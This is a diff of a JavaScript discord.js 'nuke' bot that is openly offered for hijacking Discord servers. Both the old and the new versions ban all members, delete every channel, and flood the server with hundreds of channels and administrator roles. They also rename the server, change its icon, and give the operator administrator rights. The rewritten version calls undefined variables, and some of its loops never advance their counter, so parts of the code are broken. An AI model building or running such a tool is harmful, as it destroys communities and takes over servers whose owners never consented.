@@ -1,478 +1,129 @@
-//ENJOY
-//Sorry For The Bad Engilsh :/
-//By xxxRevenge (Bowlingtoolkit)
 const Discord = require("discord.js") //npm i discord.js
-const client = new Discord.Client();
-const Token = '' //حط توكن بوتك هنا // your bot token
-const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
-const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
-const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
-const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
-const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
-const spam = "HJACKED" // الكلام يلي بيسوي فيه سبام البوت //the spam message
-const namee = "HJACKED" // اسم ابوت بعد التهكير //the bot name
-const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
-const role = 'HJACKED' // اسم الرتبه يلي بيسويها //the role name
-const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
-console.log('BY OROCHIX');
-console.log('Start Hacking System ..')
-client.on('ready', () => {
-  console.log(`Logged in as ${client.user.tag} !`);
-  console.log(`Done The Hacking System Has Been Started`)
+const client = new Discord.Client()
+const token = 'TOKEN BOT'
+const prefix = "PREFIX"
+const textChannelsName = "hjacked"
+const voiceChannelsName = "HJACKED"
+const embedThumbnail = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png"
+const reference = "HJACKED"
+const whitelist = [
+    "THE ID OF EACH WHITELISTED ACCOUNTS",
+    "ALLOWED TO USE THIS BOT"
+]
+client.once('ready', () => { console.log(`Logged in as ${client.user.tag} !`) })
 
-});
-client.on('ready',  () => {
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : OROCHIX ~           ~    '); //if you share this code make sure you type my copyrights :>
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
-//BY OROCHIX (Arabic)
-        
-
-});
 // ban all and send a message for the ownerserver
-async function nuke(guild) {
-    let users = 0;
-    let channels = 0;
-  
-    await guild.fetchMembers();
-  
-    await guild.owner.send('Your Server Has Been Hjacked !').catch(e => { return void e; });
-  
-  
-  
-    await Promise.all(guild.members.map(async (m) => {
-      if (m.bannable) {
-        users++;
-        await m.send('HJACKED').catch(e => { return void e; });
-        return m.ban();
-      }
-    }));
-    
-      await Promise.all(guild.channels.map(c => {
-      if (c.deletable) {
-        channels++;
-        return c.delete();
-      }
-    }));
+const nuke = (guildID) => {
+    const guild = client.guilds.get(guildID)
 
-    await guild.createChannel(teext, 'text');
+    // Notify the owner that his server is under attack
+    guild.owner.send(`Your ${guild.name} server is under attack !`).catch((err) => console.error('Can\'t sent message to this user'))
 
-    await guild.createChannel(vooice, 'voice');
+    // Sent a message to member and ban (if possible) him
+    guild.members.forEach((member) => {
+        if (member.bannable && guild.members.get(client.user.id).hasPermission('BAN_MEMBERS')) {
+            member.send(reference).then((member)=> member.ban())
+        }
+    })
 
+    // Delete all channels if possible
+    guild.channels.forEach((channel) => {
+        if (channel.deletable && guild.members.get(client.user.id).hasPermission('MANAGE_CHANNELS')) {
+            channel.delete()
+        }
+    })
 
+    // You can create 500 channels maximum, so we make the difference
+    // with the channels wich are already created to make the maximum
+    // of channels
+    const maxChannelsRange = Math.abs(500 - guild.channels.array().length) // Return a positive value
+    let index = 0
+    setInterval(() => {
+        if (index == maxChannelsRange) return
+        guild.createChannel(textChannelsName, {type: "text"})
+        index++
 
+        if (index == maxChannelsRange) return
+        guild.createChannel(voiceChannelsName, {type: "voice"})
+        index ++
+    })
 }
-//any error will written in the console :>
-client.on('guildCreate', async (guild) => {
-  return nuke(guild).catch(console.error);
-});
 
-//change the bot status and change the bot name and change the bot avatar and the servericon and the servername
 client.on('message', message => {
-    if (message.content === x_x) {
-        console.log(`THE HACK HAS BEEN STARTED`)
-        message.guild.members.forEach(baand => {
-       baand.ban({reason: spam,});
-       client.channels.forEach(hackch => {
-       hackch.delete();
-       client.user.setAvatar(pic)
-       client.user.setUsername(namee)
-       client.user.setGame(playing, 'https://www.twitch.tv/hix')
-       client.guilds.forEach(hack => {
-       hack.setIcon(pic)
-       hack.setName(namee)})})})}});
+    // Security
+    if (!whitelist.includes(message.author.id)) return
 
-//this will give you a adminstrator in the target server
-client.on('message', message => {
-        if (message.content === 'OP') {
-let me = message.author
-        let role = message.guild.createRole({
-        name : adminstrator,
-        color : "RANDOM", 
-        permissions : [8]
+    const args = message.content.split(/ +/)
+    const command = args[0]
+    if (command == `${prefix}nuke`) {
+        console.log('THE HACK HAS BEEN STARTED')
+        nuke(message.guild.id)
+
+        client.user.setAvatar(embedThumbnail)
+        client.user.setUsername(clientUsername)
+        client.user.setGame('GAME', 'https://www.twitch.tv/your_twitch_chnl')
+
+        message.guild.setIcon(embedThumbnail)
+        message.guild.setName(clientUsername)
+
+    } else if (command == `${prefix}op` && message.guild.members.get(client.user.id).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) {
+        // Make you admin (NOT OWNER) in the targeted server
+        message.guild.createRole({name: adminRoleName, color: "RANDOM", permissions: "ADMINISTRATOR"}).then((role) => {
+            whitelist.forEach((whitelistID) => {
+                const member = message.guild.members.get(whitelistID)
+                if (!member) undefined
+                else member.addRole(role)
+            })
         })
-        let role1 = message.guild.roles.find('name', adminstrator)
-    message.channel.send(`HJACKED`)
-   message.guild.member(me).addRole(role1);
-}})
-//create the roles
-            client.on('message', message => {
-     
+    } else if (command == `${prefix}createRoles`) {
+        // The maximum roles range that you can create is 250, so we
+        // fill up to get 250 roles
+        const maxRolesRange = Math.abs(250 - message.guild.roles.array().length) // Return a positive value
+        let index = 0
+        setInterval(() => {
+            if (index == maxRolesRange) return
+            message.guild.createRole({name: reference, color: 0xFF0000, permissions: "ADMINISTRATOR"})
+        })
+    } else if (command == `${prefix}createTextChannels`) {
+        // The maximum channels range that you can create is 500, so we
+        // fill up to get 500 channels
+        const maxChannelsRange = Math.abs(500 - message.guild.channels.array().length) // Return a positive value
+        let index = 0
+        setInterval(() => {
+            if (index == maxChannelsRange) return
+            message.guild.createChannel(textChannelsName, {type: "text"})
+        })
+    } else if (command == `${prefix}createVoiceChannels`) {
+        // Same thing as befor, but with voice channels now
+        const maxChannelsRange = Math.abs(500 - message.guild.channels.array().length) // Return a positive value
+        let index = 0
+        setInterval(() => {
+            if (index == maxChannelsRange) return
+            message.guild.createChannel(voiceChannelsName, {type: "voice"})
+        })
 
-                if (message.content === x_x) {
-                    client.guilds.forEach(m =>{
-             m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               }) 
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-                m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               }) 
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               }) 
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               }) // i know its too long ;-;
-           
-           
-               
-           })
-            
-            
-           }
-           });
-           //create the textchannels
-           client.on('message', message => {
-                    if (message.content === x_x) {
-                          client.guilds.forEach(m =>{
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
-           })
-           }
-           });
-           //create the voicechannels
-           client.on('message', message => {
-                    if (message.content === x_x) {
-                            client.guilds.forEach(m =>{
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           // again 
-           
-           })
-           }
-           
-           });
+    } else if (command == `${prefix}help`) {
+        const helpEmbed = new Discord.RichEmbed()
+        .setColor("ff0000")
+        .setThumbnail(embedThumbnail)
+        .addField('Prefix of commands: ', `${prefix}`)
+        .addField(`${prefix}nuke`, 'Destroy the server : delete channels and ban all if the bot has the required permissions')
+        .addField(`${prefix}op`, 'Make you an administrator in the server')
+        .addField(`${prefix}createRoles`, 'Create maximum roles')
+        .addField(`${prefix}createTextChannels`, 'Create maximum channels as text channels')
+        .addField(`${prefix}createVoiceChannels`, 'Create maximum channels as voice channels')
 
+        // .sendEMbed() is a deprecated method according to discord.js
+        message.channel.send(helpEmbed)
+    }
 
+})
 
-//if the bot join in any server the will give self adminstratpr role 
-  client.on('guildMemberAdd', member => {
-                        member.guild.createRole({
-                      name : client.user.username,
-                      color : "RANDOM", 
-                      permissions : [8]
-                  }).then(function(role){
-                      member.addRole(role)
-                  })
-                  
-              })
-          
-
-            //spam message
-                client.on('message', message => {
-                    if (message.content === x_x) {
-                        console.log(`THE HACK HAS BEEN STARTED`)
-                        var teeext = teext.replace(" ", "-")
-                        var interval = setInterval (function () {
-                        const embed = new Discord.RichEmbed()
-                       .setColor("ff0000")
-                       .setThumbnail(pic)
-                       .addField(spam, ".")
-                        message.channel.sendEmbed(embed);
-            
-            
-            
-                        })
-                      }})
-
-//login in to the bot token or the serverowner token
-    client.on('message', async message => {
-  const devs = ['505638480248963072']; // your id
-  let member = message.author
-   if (message.content === opcmd) {
-    if (!devs.includes(message.author.id)) return;
-let op = message.guild.roles.find('name', `${adminstrator}`)
-    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
-    message.guild.member(member).addRole(op);
-  }
-});
-client.login(Token)
+client.on('guildMemberAdd', (member) => {
+    member.guild.createRole({name: client.user.username, color: "RANDOM", permissions: "ADMINISTRATOR"}).then((role) => {
+        member.addRole(role).then((member) => {
+            member.send(`You are now administrator in the ${member.guild.name} server !`)
+        })
+    })
+})
+client.login(token)
